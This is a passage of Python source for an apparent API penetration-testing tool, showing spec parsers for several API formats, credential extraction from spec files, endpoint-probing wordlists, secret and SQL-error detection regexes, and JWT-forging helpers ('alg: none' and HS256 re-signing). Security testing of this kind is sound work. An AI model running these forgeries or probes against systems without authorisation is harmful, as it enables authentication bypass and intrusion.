    ("verb_tampering",      "Phase 17: HTTP verb tampering — method override header bypass"),
    ("soap",                "Phase 18: SOAP/WS-Security — WSDL enum, WS-Security bypass, SOAP injection"),
    ("file_upload_info",    "Phase 19: File upload endpoint detection — accepted types (informational)"),
    ("access_matrix",       "Phase 20: Multi-credential access matrix — per-role endpoint access, BFLA, unauthenticated access"),
]

# ---------------------------------------------------------------------------
# Settings loader
# ---------------------------------------------------------------------------

def _deep_merge(base: dict, override: dict) -> dict:
    result = copy.deepcopy(base)
    for k, v in override.items():
        if k in result and isinstance(result[k], dict) and isinstance(v, dict):
            result[k] = _deep_merge(result[k], v)
        else:
            result[k] = v
    return result


def _load_settings(path: str | None) -> dict:
    if not path:
        return copy.deepcopy(DEFAULT_SETTINGS)
    p = Path(path)
    if not p.exists():
        con.err(f"Settings file not found: {path}")
        sys.exit(1)
    try:
        data = json.loads(p.read_text())
        return _deep_merge(DEFAULT_SETTINGS, data)
    except json.JSONDecodeError as exc:
        con.err(f"Invalid JSON in settings file: {exc}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Argument parser
# ---------------------------------------------------------------------------

def _parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(
        prog="siphon",
        description="Siphon — API Penetration Testing Orchestrator v" + VERSION,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="\n".join(f"  {n:<16} {d}" for n, d in PHASE_LIST),
    )
    ap.add_argument("--settings",     metavar="FILE",  help="JSON settings file")
    ap.add_argument("--url",          metavar="URL",   help="Primary API base URL")
    ap.add_argument("--urls",         metavar="URLS",
                    help="Comma-separated list of additional API base URLs")
    ap.add_argument("--openapi",      metavar="URL",
                    help="OpenAPI/Swagger spec URL or file path (legacy; prefer --spec-file)")
    ap.add_argument("--spec-file",    metavar="FILE",  action="append", dest="spec_files",
                    help="API spec file or URL to ingest (may be repeated); supports "
                         "OpenAPI JSON/YAML, Swagger, GraphQL SDL/introspection, "
                         "Postman Collection, Insomnia export, HAR")
    ap.add_argument("--project",      metavar="DIR",   help="Output directory")
    ap.add_argument("--fast",         action="store_true", help="Skip slow phases")
    ap.add_argument("--resume",       metavar="DIR",   help="Resume from existing output directory")
    ap.add_argument("--no-injection", action="store_true", help="Skip injection phase")
    ap.add_argument("--no-auth",      action="store_true", help="Skip auth-required phases")
    ap.add_argument("--list-phases",  action="store_true", help="List all phases and exit")
    ap.add_argument("--username",     metavar="USER",  help="Auth username")
    ap.add_argument("--password",     metavar="PASS",  help="Auth password")
    ap.add_argument("--auth-method",   metavar="METHOD",
                    choices=["bearer","basic","digest","apikey","cookie_login","token_login",
                             "oauth2_client_creds","header_creds","ntlm"],
                    help="Auth method (bearer|basic|digest|apikey|cookie_login|token_login|oauth2_client_creds|header_creds|ntlm)")
    ap.add_argument("--auth-type",    metavar="TYPE",  choices=["token", "basic", "form"],
                    help="Legacy alias for --auth-method")
    ap.add_argument("--login-url",    metavar="URL",   help="Login endpoint URL (cookie_login / token_login)")
    ap.add_argument("--auth-token",   metavar="TOKEN", help="Pre-obtained auth token (bearer)")
    ap.add_argument("--threads",      type=int,        metavar="N")
    ap.add_argument("--timeout",      type=int,        metavar="SEC")
    ap.add_argument("--proxy",        metavar="URL",   help="HTTP proxy")
    ap.add_argument("--version",      action="version", version=f"siphon {VERSION}")
    return ap.parse_args()


def _auto_unlock_phases(settings: dict) -> dict:
    """Enable all phases when auth is configured."""
    scan = settings.get("scan", {})
    if not scan.get("auth", {}).get("enabled", False):
        return settings
    phases = scan.setdefault("phases", {})
    for phase in phases:
        phases[phase] = True
    return settings


def _apply_args(settings: dict, args: argparse.Namespace) -> dict:
    scan = settings["scan"]
    if args.url:
        scan["api_base_url"] = args.url.rstrip("/")
    if getattr(args, "urls", None):
        extras = [u.strip().rstrip("/") for u in args.urls.split(",") if u.strip()]
        existing = scan.get("api_base_urls", [])
        scan["api_base_urls"] = existing + [u for u in extras if u not in existing]
    if args.openapi:
        scan["openapi_url"] = args.openapi
    if getattr(args, "spec_files", None):
        existing_files = scan.get("api_spec_files", [])
        for sf in args.spec_files:
            if sf and sf not in existing_files:
                existing_files.append(sf)
        scan["api_spec_files"] = existing_files
    if args.project:
        scan["project"] = args.project
    if args.threads:
        scan["threads"] = args.threads
    if args.timeout:
        scan["timeout"] = args.timeout
    if args.proxy:
        scan["proxy"] = args.proxy
    if args.fast:
        scan["phases"]["injection"] = False
        scan["phases"]["jwt"] = False
    if args.no_injection:
        scan["phases"]["injection"] = False
    if args.no_auth:
        for phase in ("bola", "bfla", "cross_user", "session", "jwt", "auth_bypass"):
            scan["phases"][phase] = False
    if args.auth_token:
        scan["auth"]["enabled"] = True
        scan["auth"]["auth_token"] = args.auth_token
    if args.username:
        scan["auth"]["enabled"] = True
        scan["auth"]["username"] = args.username
    if args.password:
        scan["auth"]["password"] = args.password
    if getattr(args, "auth_method", None):
        scan["auth"]["method"] = args.auth_method
        scan["auth"]["enabled"] = True
    if args.auth_type:
        scan["auth"]["auth_type"] = args.auth_type  # legacy compat
    if args.login_url:
        scan["auth"]["login_url"] = args.login_url
    return settings


# ---------------------------------------------------------------------------
# JWT utilities
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _jwt_decode_token(token: str):
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, parts[2]
    except Exception:
        return None


def _jwt_none_alg(token: str) -> str | None:
    decoded = _jwt_decode_token(token)
    if not decoded:
        return None
    header, payload, _ = decoded
    header["alg"] = "none"
    new_header  = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_header}.{new_payload}."


def _jwt_forge_hs256(token: str, secret: str) -> str | None:
    decoded = _jwt_decode_token(token)
    if not decoded:
        return None
    header, payload, _ = decoded
    header["alg"] = "HS256"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


# ---------------------------------------------------------------------------
# Response analysis helpers
# ---------------------------------------------------------------------------

_SENSITIVE_RE = re.compile(
    r'\b(password|passwd|secret|token|api_key|apikey|ssn|social_security|'
    r'credit_card|cc_number|card_number|cvv|private_key|private|'
    r'access_token|refresh_token|client_secret|aws_secret|'
    r'auth_token|session_token|bearer)\b',
    re.IGNORECASE
)

_SQL_ERR_RE = re.compile(
    r'(sql syntax|mysql_fetch|ORA-\d+|syntax error|pg_query|sqlite3|'
    r'SQLSTATE|Unclosed quotation|Microsoft OLE DB|ODBC SQL Server|invalid query)',
    re.IGNORECASE
)

_NOSQL_ERR_RE = re.compile(
    r'(MongoError|BSONTypeError|CastError|mongodb|mongoose)',
    re.IGNORECASE
)

_SSRF_INTERNAL_RE = re.compile(
    r'(169\.254\.169\.254|instance-data|computeMetadata|'
    r'ami-id|instance-id|meta-data|localhost)',
    re.IGNORECASE
)


def _extract_json_keys(obj, prefix="") -> list:
    keys = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            full_key = f"{prefix}.{k}" if prefix else k
            keys.append(full_key)
            keys.extend(_extract_json_keys(v, full_key))
    elif isinstance(obj, list):
        for item in obj:
            keys.extend(_extract_json_keys(item, prefix))
    return keys


def _safe_get(sess: requests.Session, url: str, timeout: int = 10, **kwargs):
    try:
        return sess.get(url, timeout=timeout, **kwargs)
    except Exception:
        return None


def _safe_request(sess: requests.Session, method: str, url: str, timeout: int = 10, **kwargs):
    try:
        return sess.request(method, url, timeout=timeout, **kwargs)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# API spec format detection + multi-format parsers
# ---------------------------------------------------------------------------

def _detect_spec_format(content_dict: dict | None, content_str: str) -> str:
    """Detect API spec format from parsed content or raw text."""
    if content_dict:
        # OpenAPI 3.x
        if str(content_dict.get("openapi", "")).startswith("3"):
            return "openapi3"
        # Swagger 2.x
        if content_dict.get("swagger") == "2.0":
            return "swagger2"
        # Postman Collection v2.0 / v2.1
        info = content_dict.get("info", {})
        if isinstance(info, dict) and (
            "_postman_id" in info or
            "postman" in info.get("schema", "").lower()
        ):
            return "postman"
        # GraphQL introspection JSON
        if "__schema" in content_dict or (
            "data" in content_dict and
            isinstance(content_dict.get("data"), dict) and
            "__schema" in content_dict["data"]
        ):
            return "graphql_introspection"
        # Insomnia export
        if content_dict.get("_type") == "export" and "resources" in content_dict:
            return "insomnia"
        # HAR
        if "log" in content_dict and isinstance(content_dict.get("log"), dict) and \
                "entries" in content_dict["log"]:
            return "har"
        # Fallback: if it has "paths", treat as OpenAPI
        if "paths" in content_dict:
            return "swagger2"
    if content_str:
        # GraphQL SDL
        if re.search(r'\btype\s+(?:Query|Mutation|Subscription)\b', content_str):
            return "graphql_sdl"
        # YAML OpenAPI/Swagger
        if re.search(r'^openapi\s*:', content_str, re.M) or \
                re.search(r'^swagger\s*:', content_str, re.M):
            return "yaml_openapi"
    return "unknown"


def _parse_postman_spec(collection: dict) -> list:
    """Parse Postman Collection v2.0/v2.1 into endpoint inventory."""
    inventory: list = []

    def _items_to_inventory(items: list) -> None:
        for item in items:
            if "item" in item:
                _items_to_inventory(item["item"])
                continue
            req = item.get("request", {})
            if isinstance(req, str):
                continue
            method = req.get("method", "GET").upper()
            url_obj = req.get("url", {})
            if isinstance(url_obj, str):
                path = urlparse(url_obj).path or "/"
                qparams: list = []
            elif isinstance(url_obj, dict):
                raw = url_obj.get("raw", "")
                path_parts = url_obj.get("path", [])
                if path_parts:
                    path = "/" + "/".join(str(p).lstrip(":") for p in path_parts)
                else:
                    path = urlparse(raw).path or "/"
                qparams = [
                    {"name": q.get("key", ""), "in": "query", "required": False}
                    for q in url_obj.get("query", [])
                    if isinstance(q, dict) and q.get("key") and not q.get("disabled")
                ]
            else:
                continue

            body_fields: list = []
            body = req.get("body", {})
            if isinstance(body, dict):
                mode = body.get("mode", "")
                if mode == "raw":
                    try:
                        raw_body = json.loads(body.get("raw", "{}"))
                        if isinstance(raw_body, dict):
                            body_fields = list(raw_body.keys())
                    except Exception:
                        pass
                elif mode in ("urlencoded", "formdata"):
                    for f in body.get(mode, []):
                        if isinstance(f, dict) and f.get("key") and not f.get("disabled"):
                            body_fields.append(f["key"])

            inventory.append({
                "method":        method,
                "path":          path,
                "params":        qparams,
                "body_fields":   body_fields,
                "auth_required": bool(req.get("auth")),
                "operation_id":  item.get("name", ""),
                "tags":          [],
                "summary":       item.get("name", ""),
            })

    _items_to_inventory(collection.get("item", []))
    return inventory


def _parse_graphql_spec(content) -> list:
    """Parse GraphQL SDL text or introspection JSON into endpoint inventory."""
    inventory: list = []

    def _field_entry(op_type: str, field_name: str, description: str = "") -> dict:
        return {
            "method":           "POST",
            "path":             "/graphql",
            "params":           [],
            "body_fields":      [field_name],
            "auth_required":    False,
            "operation_id":     f"{op_type}.{field_name}",
            "tags":             [op_type],
            "summary":          description or field_name,
            "graphql_operation": op_type,
            "graphql_field":    field_name,
        }

    if isinstance(content, dict):
        schema = content.get("__schema") or (
            content.get("data", {}) or {}
        ).get("__schema")
        if schema:
            for type_def in (schema.get("types") or []):
                tname = type_def.get("name", "")
                if tname in ("Query", "Mutation", "Subscription"):
                    for field in (type_def.get("fields") or []):
                        inventory.append(
                            _field_entry(tname.lower(), field.get("name", ""),
                                         field.get("description", ""))
                        )
        return inventory

    if isinstance(content, str):
        for m in re.finditer(
            r'type\s+(Query|Mutation|Subscription)\s*\{([^}]+)\}', content, re.S
        ):
            op_type = m.group(1).lower()
            for fm in re.finditer(r'(\w+)\s*(?:\([^)]*\))?\s*:', m.group(2)):
                inventory.append(_field_entry(op_type, fm.group(1)))

    return inventory


def _parse_insomnia_spec(export: dict) -> list:
    """Parse Insomnia export file into endpoint inventory."""
    inventory: list = []
    for resource in export.get("resources", []):
        if resource.get("_type") != "request":
            continue
        method = resource.get("method", "GET").upper()
        try:
            path = urlparse(resource.get("url", "")).path or "/"
        except Exception:
            path = "/"
        params = [
            {"name": p.get("name", ""), "in": "query", "required": False}
            for p in resource.get("parameters", [])
            if isinstance(p, dict) and not p.get("disabled")
        ]
        body_fields: list = []
        body = resource.get("body", {})
        if isinstance(body, dict) and "json" in body.get("mimeType", ""):
            try:
                c = json.loads(body.get("text", "{}"))
                if isinstance(c, dict):
                    body_fields = list(c.keys())
            except Exception:
                pass
        inventory.append({
            "method":        method,
            "path":          path,
            "params":        params,
            "body_fields":   body_fields,
            "auth_required": bool(resource.get("authentication")),
            "operation_id":  resource.get("name", ""),
            "tags":          [],
            "summary":       resource.get("name", ""),
        })
    return inventory


def _parse_har_spec(har: dict) -> list:
    """Parse HAR file into endpoint inventory (deduplicated by method+path)."""
    inventory: list = []
    seen: set = set()
    for entry in (har.get("log") or {}).get("entries", []):
        req = entry.get("request", {})
        method = req.get("method", "GET").upper()
        try:
            path = urlparse(req.get("url", "")).path or "/"
        except Exception:
            path = "/"
        key = (method, path)
        if key in seen:
            continue
        seen.add(key)
        params = [
            {"name": q.get("name", ""), "in": "query", "required": False}
            for q in req.get("queryString", [])
            if isinstance(q, dict)
        ]
        body_fields: list = []
        post = req.get("postData", {})
        if isinstance(post, dict):
            if "json" in post.get("mimeType", ""):
                try:
                    c = json.loads(post.get("text", "{}"))
                    if isinstance(c, dict):
                        body_fields = list(c.keys())
                except Exception:
                    pass
            else:
                body_fields = [
                    p.get("name", "")
                    for p in post.get("params", [])
                    if isinstance(p, dict) and p.get("name")
                ]
        inventory.append({
            "method":        method,
            "path":          path,
            "params":        params,
            "body_fields":   body_fields,
            "auth_required": False,
            "operation_id":  f"{method}:{path}",
            "tags":          [],
            "summary":       f"{method} {path}",
        })
    return inventory


def _extract_spec_credentials(spec: dict, fmt: str) -> dict:
    """Extract credentials embedded in an API spec file.

    Returns a dict with keys any of:
      auth_type, auth_token, username, password, api_key, api_key_header,
      oauth_token_url
    Empty dict means no credentials found.
    """
    creds: dict = {}

    if fmt in ("openapi3", "swagger2", "yaml_openapi"):
        # OAS3 components/securitySchemes; Swagger2 securityDefinitions
        schemes = (
            (spec.get("components") or {}).get("securitySchemes")
            or spec.get("securityDefinitions")
            or {}
        )
        for _, scheme in schemes.items():
            if not isinstance(scheme, dict):
                continue
            stype = scheme.get("type", "").lower()
            if stype == "apikey":
                creds.setdefault("api_key_header", scheme.get("name", "X-API-Key"))
                creds.setdefault("auth_type", "apikey")
            elif stype == "http":
                http_scheme = scheme.get("scheme", "").lower()
                if http_scheme == "bearer":
                    creds.setdefault("auth_type", "bearer")
                elif http_scheme == "basic":
                    creds.setdefault("auth_type", "basic")
            elif stype == "oauth2":
                flows = scheme.get("flows") or {}
                for _, flow in flows.items():
                    if isinstance(flow, dict) and flow.get("tokenUrl"):
                        creds.setdefault("oauth_token_url", flow["tokenUrl"])
                        creds.setdefault("auth_type", "oauth2")

    elif fmt == "postman":
        auth = spec.get("auth") or {}
        if isinstance(auth, dict):
            auth_type = auth.get("type", "").lower()
            if auth_type == "bearer":
                for item in (auth.get("bearer") or []):
                    if isinstance(item, dict) and item.get("key") == "token" \
                            and item.get("value"):
                        creds["auth_token"] = item["value"]
                        creds["auth_type"] = "bearer"
            elif auth_type == "basic":
                creds["auth_type"] = "basic"
                for item in (auth.get("basic") or []):
                    if not isinstance(item, dict):
                        continue
                    if item.get("key") == "username":
                        creds["username"] = item.get("value", "")
                    elif item.get("key") == "password":
                        creds["password"] = item.get("value", "")
            elif auth_type == "apikey":
                creds["auth_type"] = "apikey"
                for item in (auth.get("apikey") or []):
                    if not isinstance(item, dict):
                        continue
                    if item.get("key") == "value":
                        creds["api_key"] = item.get("value", "")
                    elif item.get("key") == "key":
                        creds["api_key_header"] = item.get("value", "X-API-Key")

    return creds


def _dispatch_spec_parse(content_dict: dict | None,
                         content_str: str, fmt: str) -> list:
    """Dispatch spec content to the correct parser and return endpoint list."""
    if fmt in ("openapi3", "swagger2", "yaml_openapi") and content_dict:
        return _parse_openapi_spec(content_dict)
    if fmt == "postman" and content_dict:
        return _parse_postman_spec(content_dict)
    if fmt in ("graphql_introspection", "graphql_sdl"):
        return _parse_graphql_spec(content_dict if fmt == "graphql_introspection"
                                   else content_str)
    if fmt == "insomnia" and content_dict:
        return _parse_insomnia_spec(content_dict)
    if fmt == "har" and content_dict:
        return _parse_har_spec(content_dict)
    # Unknown / fallback: try OpenAPI parser
    if content_dict and "paths" in content_dict:
        return _parse_openapi_spec(content_dict)
    return []


def _load_spec_file(path_or_url: str, sess: requests.Session,
                    timeout: int) -> tuple[list, dict, str]:
    """Load and parse a spec file or URL.

    Returns (inventory, credentials, format_name).
    """
    content_str = ""
    content_dict: dict | None = None

    # --- fetch content ---
    if path_or_url.startswith(("http://", "https://")):
        resp = _safe_get(sess, path_or_url, timeout=timeout)
        if not resp or resp.status_code != 200:
            con.err(f"Could not fetch spec from {path_or_url}")
            return [], {}, "unknown"
        content_str = resp.text
    else:
        p = Path(path_or_url)
        if not p.exists():
            con.err(f"Spec file not found: {path_or_url}")
            return [], {}, "unknown"
        content_str = p.read_text(encoding="utf-8", errors="replace")

    # --- parse content ---
    try:
        content_dict = json.loads(content_str)
    except json.JSONDecodeError:
        pass
    if content_dict is None:
        try:
            import yaml as _yaml
            content_dict = _yaml.safe_load(content_str)
            if not isinstance(content_dict, dict):
                content_dict = None
        except Exception:
            pass

    fmt = _detect_spec_format(content_dict, content_str)
    inventory = _dispatch_spec_parse(content_dict, content_str, fmt)
    creds = _extract_spec_credentials(content_dict or {}, fmt) if content_dict else {}

    return inventory, creds, fmt


# ---------------------------------------------------------------------------
# Undocumented endpoint probing
# ---------------------------------------------------------------------------

_API_PROBE_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
    "/v1", "/v2", "/v3", "/v4",
    "/graphql", "/graphiql", "/playground", "/gql",
    "/users", "/user", "/me", "/accounts", "/account", "/profile", "/profiles",
    "/auth", "/authenticate", "/login", "/logout", "/register", "/signup", "/signout",
    "/admin", "/administrator", "/management", "/manage", "/dashboard", "/panel",
    "/health", "/healthz", "/health-check", "/status", "/ping", "/ready", "/live",
    "/config", "/configuration", "/settings", "/preferences",
    "/search", "/find", "/query", "/filter",
    "/products", "/product", "/items", "/item", "/catalog", "/catalogue",
    "/orders", "/order", "/cart", "/checkout", "/basket",
    "/tokens", "/token", "/keys", "/key", "/secrets", "/secret", "/credentials",
    "/files", "/file", "/uploads", "/upload", "/download", "/downloads", "/attachments",
    "/webhooks", "/webhook", "/hooks", "/hook",
    "/events", "/event", "/notifications", "/notification", "/messages", "/message",
    "/docs", "/documentation", "/swagger", "/openapi", "/spec", "/schema", "/redoc",
    "/metrics", "/stats", "/statistics", "/analytics", "/telemetry", "/monitoring",
    "/roles", "/role", "/permissions", "/permission", "/groups", "/group",
    "/organizations", "/organization", "/org", "/tenants", "/tenant",
    "/payments", "/payment", "/billing", "/invoice", "/invoices", "/transactions",
    "/subscriptions", "/subscription", "/plans", "/plan", "/pricing",
    "/reset-password", "/forgot-password", "/password-reset", "/verify", "/confirm",
    "/sessions", "/session", "/refresh", "/revoke", "/introspect",
    "/internal", "/private", "/debug", "/test", "/dev", "/staging",
    "/emails", "/email", "/contacts", "/contact",
    "/reports", "/report", "/export", "/exports", "/imports",
    "/inventory", "/warehouses", "/locations", "/addresses", "/address",
    "/comments", "/comment", "/reviews", "/review", "/ratings", "/rating",
    "/tags", "/tag", "/categories", "/category", "/labels", "/label",
    "/assets", "/media", "/images", "/image", "/videos", "/video",
]


def _probe_undocumented_endpoints(
    settings: dict,
    sess: requests.Session,
    output: OutputManager,
    spec_inventory: list,
    target_root: str,
) -> None:
    """Probe for API endpoints not present in the provided spec inventory.

    Creates a MEDIUM finding for each active path not documented in the spec.
    Only runs when a spec was actually loaded (spec_inventory is non-empty).
    """
    if not spec_inventory:
        return

    scan = settings["scan"]
    timeout = scan.get("timeout", 10)
    threads = min(scan.get("threads", 10), _SCAN_SEM.limit)

    # Normalise known spec paths for comparison
    known_paths: set[str] = set()
    for ep in spec_inventory:
        p = ep.get("path", "").rstrip("/") or "/"
        # Strip path parameters like {id} to match static prefix
        p_static = re.sub(r'\{[^}]+\}', '*', p)
        known_paths.add(p_static)
        known_paths.add(p)

    con.status("discovery", "running", f"Probing {len(_API_PROBE_PATHS)} paths for undocumented endpoints")

    found_undoc = 0

    def _probe(probe_path: str) -> tuple[str, int] | None:
        url = target_root.rstrip("/") + probe_path
        resp = _safe_get(sess, url, timeout=timeout, allow_redirects=False)
        if resp is None:
            return None
        if resp.status_code in (200, 201, 202, 204):
            return (probe_path, resp.status_code)
        return None

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_probe, p): p for p in _API_PROBE_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if not result:
                continue
            probe_path, status_code = result
            norm = probe_path.rstrip("/") or "/"
            # Check if path matches any known spec path
            if norm in known_paths:
                continue
            # Also check if any spec path starts with this probe path
            if any(kp.startswith(norm) for kp in known_paths):
                continue
            found_undoc += 1
            output.add_finding(
                phase="discovery",
                title="Undocumented API Endpoint Detected",
                severity="MEDIUM",
                url=target_root.rstrip("/") + probe_path,
                detail=(f"API endpoint '{probe_path}' returned HTTP {status_code} "
                        f"but is not documented in the provided API specification."),
                evidence=f"GET {target_root.rstrip('/')}{probe_path} → {status_code}",
                remediation=(
                    "Ensure all active API endpoints are documented in the API specification. "
                    "Remove or disable unintended undocumented endpoints."
                ),
            )

    if found_undoc:
        con.warn(f"Undocumented endpoints: {found_undoc} active paths not in spec")
    else:
        con.info("No undocumented endpoints detected beyond known spec paths")


# ---------------------------------------------------------------------------
# API structure map builder
# ---------------------------------------------------------------------------

def build_api_map(
    inventory: list,
    spec_paths: "set[str] | None" = None,
    rogue_paths: "set[str] | None" = None,
    auth_cfg: "dict | None" = None,
) -> dict:
    """Build a structured API map from the endpoint inventory.

    The map is a dict keyed by path. Each entry has:
      - methods: {METHOD: {status_codes, max_status, auth_required, auth_users, rogue}}
      - from_spec: bool
      - rogue: bool  (path not in spec)

    Args:
        inventory:   List of endpoint dicts (output of phase_discovery).
        spec_paths:  Set of paths that came from the provided spec file.
        rogue_paths: Set of paths that were found during testing but not in spec.
        auth_cfg:    scan.auth dict; used to annotate auth usernames.
    """
    spec_paths  = spec_paths  or set()
    rogue_paths = rogue_paths or set()

    username = ""
    if auth_cfg and auth_cfg.get("enabled"):
        username = auth_cfg.get("username", "")

    map_data: dict = {}

    for ep in inventory:
        path   = ep.get("path", "/")
        method = ep.get("method", "GET").upper()
        # Determine if this endpoint came from the spec
        path_norm = path.rstrip("/") or "/"
        from_spec = path_norm in spec_paths or path in spec_paths
        is_rogue  = path_norm in rogue_paths or path in rogue_paths

        if path not in map_data:
            map_data[path] = {
                "from_spec": from_spec or not is_rogue,
                "rogue":     is_rogue,
                "methods":   {},
            }
        else:
            # Update flags if more info available
            if from_spec:
                map_data[path]["from_spec"] = True
            if is_rogue:
                map_data[path]["rogue"] = True

        # Determine response code from inventory (tool-discovered endpoints carry status)
        summary = ep.get("summary", "")
        status_code = None
        m = re.search(r'\((\d{3})\)', summary)
        if m:
            status_code = int(m.group(1))

        auth_req = ep.get("auth_required", False)
        method_entry = map_data[path]["methods"].get(method, {
            "status_codes": [],
            "max_status":   None,
            "auth_required": auth_req,
            "auth_users":   [],
            "rogue":        is_rogue,
        })
        if status_code and status_code not in method_entry["status_codes"]:
            method_entry["status_codes"].append(status_code)
        if auth_req and username and username not in method_entry["auth_users"]:
            method_entry["auth_users"].append(username)
        # Most permissive = lowest 2xx/3xx code, or the highest non-4xx
        if method_entry["status_codes"]:
            ok_codes = [c for c in method_entry["status_codes"] if c < 400]
            method_entry["max_status"] = min(ok_codes) if ok_codes else max(method_entry["status_codes"])
        map_data[path]["methods"][method] = method_entry

    # Sort paths for deterministic output
    sorted_map = {p: map_data[p] for p in sorted(map_data.keys())}
    return sorted_map


def update_api_map_from_findings(api_map: dict, findings: list, auth_cfg: "dict | None" = None) -> dict:
    """Enrich the api_map with response codes and auth data from scan findings.

    Iterates findings and records observed status codes and auth annotations
    for the matching endpoint paths.
    """
    username = ""
    if auth_cfg and auth_cfg.get("enabled"):
        username = auth_cfg.get("username", "")

    for finding in findings:
        url = finding.get("url", "")
        if not url:
            continue
        try:
            parsed = urlparse(url)
            path = parsed.path or "/"
        except Exception:
            continue

        # Extract HTTP method and status code from evidence
        evidence = finding.get("evidence", "")
        method_hint = "GET"
        status_hint = None
        m = re.search(r'(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS)\s+\S+\s+(?:→|->)\s+(\d{3})', evidence, re.I)
        if m:
            method_hint = m.group(1).upper()
            status_hint = int(m.group(2))

        # Find closest matching path in api_map (exact or prefix)
        matched_path = None
        if path in api_map:
            matched_path = path
        else:
            # Try matching by prefix (strip trailing slash)
            for p in api_map:
                if path.startswith(p.rstrip("/") + "/") or p.startswith(path.rstrip("/") + "/"):
                    matched_path = p
                    break

        if matched_path is None:
            # Add as new entry if path looks like an API endpoint
            if any(seg.startswith("v") and seg[1:].isdigit() for seg in path.split("/")):
                api_map[path] = {
                    "from_spec": False, "rogue": False,
                    "methods": {},
                }
                matched_path = path

        if matched_path and status_hint:
            methods = api_map[matched_path]["methods"]
            if method_hint not in methods:
                methods[method_hint] = {
                    "status_codes": [],
                    "max_status": None,
                    "auth_required": False,
                    "auth_users": [],
                    "rogue": False,
                }
            entry = methods[method_hint]
            if status_hint not in entry["status_codes"]:
                entry["status_codes"].append(status_hint)
            # Auth annotation
            if username and finding.get("severity", "") not in ("INFO",):
                auth_indicators = ("401", "403", "auth", "token", "session", "credential")
                if any(ind in evidence.lower() for ind in auth_indicators):
                    entry["auth_required"] = True
                    if username not in entry["auth_users"]:
                        entry["auth_users"].append(username)
            ok_codes = [c for c in entry["status_codes"] if c < 400]
            entry["max_status"] = min(ok_codes) if ok_codes else (max(entry["status_codes"]) if entry["status_codes"] else None)

    return api_map


# ---------------------------------------------------------------------------
# Phase 0: Discovery — OpenAPI/Swagger spec parsing + endpoint inventory
# ---------------------------------------------------------------------------

_DISCOVERY_PATHS = [
    "/swagger.json",
    "/openapi.json",
    "/openapi.yaml",
    "/api/docs",
    "/api-docs",
    "/swagger/v1/swagger.json",
    "/swagger/v2/swagger.json",
    "/v2/api-docs",
    "/v3/api-docs",
    "/api/swagger.json",
    "/api/openapi.json",
    "/api/v1/swagger.json",
    "/api/v2/swagger.json",
    "/api/v3/swagger.json",
    "/docs/swagger.json",
    "/swagger-ui/swagger.json",
    "/.well-known/openapi.json",
    "/api/spec.json",
    "/api/schema",
    "/schema.json",
]


def _parse_openapi_spec(spec: dict) -> list:
    """Parse OpenAPI 2.x or 3.x spec and return list of endpoint dicts."""
    inventory = []
    paths = spec.get("paths", {})
    # Determine base path
    base = ""
    if "basePath" in spec:
        base = spec["basePath"].rstrip("/")
    servers = spec.get("servers", [])
    if servers and isinstance(servers, list):
        server_url = servers[0].get("url", "")
        # Use path component only if full URL
        parsed = urlparse(server_url)
        if parsed.path and parsed.path != "/":
            base = parsed.path.rstrip("/")

    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        for method, op in methods.items():
            if method.lower() in ("get", "post", "put", "delete", "patch",
                                   "head", "options", "trace"):
                if not isinstance(op, dict):
                    continue
                params = []
                for p in op.get("parameters", []):
                    if isinstance(p, dict):
                        params.append({
                            "name": p.get("name", ""),
                            "in":   p.get("in", "query"),
                            "required": p.get("required", False),
                        })
                # Extract request body fields (OAS3)
                body_fields = []
                req_body = op.get("requestBody", {})
                if req_body:
                    content = req_body.get("content", {})
                    for ct, ct_info in content.items():
                        schema = ct_info.get("schema", {})
                        props = schema.get("properties", {})
                        body_fields.extend(list(props.keys()))

                auth_required = bool(op.get("security", spec.get("security", [])))
                inventory.append({
                    "method":         method.upper(),
                    "path":           base + path,
                    "params":         params,
                    "body_fields":    body_fields,
                    "auth_required":  auth_required,
                    "operation_id":   op.get("operationId", ""),
                    "tags":           op.get("tags", []),
                    "summary":        op.get("summary", ""),
                })
    return inventory


def _fetch_spec(url_or_path: str, sess: requests.Session, timeout: int) -> dict | None:
    """Fetch and parse an OpenAPI spec from URL or file path."""
    # File path
    if not url_or_path.startswith("http"):
        p = Path(url_or_path)
        if p.exists():
            content = p.read_text()
        else:
            con.err(f"Spec file not found: {url_or_path}")
            return None
    else:
        resp = _safe_get(sess, url_or_path, timeout=timeout)
        if not resp or resp.status_code != 200:
            return None
        content = resp.text

    # Try JSON first
    try:
        return json.loads(content)
    except json.JSONDecodeError:
        pass
    # Try YAML
    try:
        import yaml
        return yaml.safe_load(content)
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Embedded API path wordlist (fallback when no system wordlist found)
# ---------------------------------------------------------------------------

_SIPHON_API_PATHS = [
    # Versioned API roots
    "/api", "/api/v1", "/api/v2", "/api/v3", "/api/latest", "/v1", "/v2", "/v3",
    # Core resources
    "/api/v1/users", "/api/v1/user", "/api/v1/accounts", "/api/v1/account",
    "/api/v1/admin", "/api/v1/health", "/api/v1/status", "/api/v1/me",
    "/api/v1/profile", "/api/v1/settings", "/api/v1/config",
    "/api/v2/users", "/api/v2/admin", "/api/v2/health", "/api/v2/me",
    # Auth
